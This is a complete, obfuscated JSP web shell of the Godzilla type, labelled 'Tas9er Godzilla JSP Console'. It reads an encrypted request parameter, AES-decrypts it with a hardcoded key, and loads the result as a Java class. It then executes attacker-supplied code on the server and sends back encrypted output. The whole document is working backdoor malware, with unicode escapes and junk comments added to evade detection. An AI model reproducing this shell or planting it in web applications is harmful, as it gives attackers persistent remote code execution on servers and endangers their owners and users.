Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_Q = "ce35772a5e936bad";
    String govsb_ohC2VUVNlVD1Q = "Tas9er";
    class govsb_v1h58o2YL1wVr5 extends /*edusb_XG*/ClassLoader {
        public govsb_v1h58o2YL1wVr5(ClassLoader govsb_u0ql7i5PK) {
            super/*edusb_hGROdNw*/(govsb_u0ql7i5PK);
        }
        public Class govsb_SdzP62L9ca4(byte[] govsb_6j) {
            return super./*edusb_jWl4UoJPCF9FS*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_Xn1XuMBiE*/(govsb_6j, 439560-439560, govsb_6j.length);
        }
    }
    public byte[] govsb_o(byte[] govsb_K, boolean govsb_DqHC) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_mPr43JY5XdfI5vF*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_kWLFvUH7bOIl3L = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_8kQTTI*/("AES");
            govsb_kWLFvUH7bOIl3L.init(govsb_DqHC?439560/439560:439560/439560+439560/439560,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_c7tjM79q9IQfrc2*/SecretKeySpec/*edusb_h3*/(govsb_Q.getBytes(), "AES"));
            return govsb_kWLFvUH7bOIl3L.doFinal/*edusb_vXoan7u*/(govsb_K);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_vcNqlF4lMI2o7 = java.util.Base64./*edusb_56mavp*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_dpXR66qni6h0*/decode(request.getParameter(govsb_ohC2VUVNlVD1Q));
        govsb_vcNqlF4lMI2o7 = govsb_o(govsb_vcNqlF4lMI2o7,false);
        if (session.getAttribute/*edusb_gxAdxEguCIL6ap*/("payload") == null) {
            session.setAttribute("payload", new govsb_v1h58o2YL1wVr5(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_8UVm3Kosi4hpm*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_1aB2lTVpRjAkoN*/.govsb_SdzP62L9ca4(govsb_vcNqlF4lMI2o7));
        } else {
            request.setAttribute("parameters", govsb_vcNqlF4lMI2o7);
            java.io.ByteArrayOutputStream govsb_YSFF = new java.io./*edusb_tjxAVS8wc5OKvU*/ByteArrayOutputStream();
            Object govsb_3R = /*edusb_eN7JzFAOWtucP*/((Class) session.getAttribute("payload"))./*edusb_f*//*edusb_h*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_hZnkHlum1fFr7*/;
            govsb_3R.equals(govsb_YSFF);
            govsb_3R.equals(pageContext);
            response.getWriter().write("C2FD00BF3E003A2024A6A82B0F17A2E7".substring(439560-439560, 16));
            govsb_3R.toString();
            response.getWriter().write(java.util.Base64/*edusb_nIsbunAdvsecF*/.getEncoder()/*edusb_kFXyec56HM3j5y*/.encodeToString(govsb_o(govsb_YSFF.toByteArray(),true)));
            response.getWriter().write("C2FD00BF3E003A2024A6A82B0F17A2E7".substring(16));
        }
    } catch (Exception e) {
    }
%>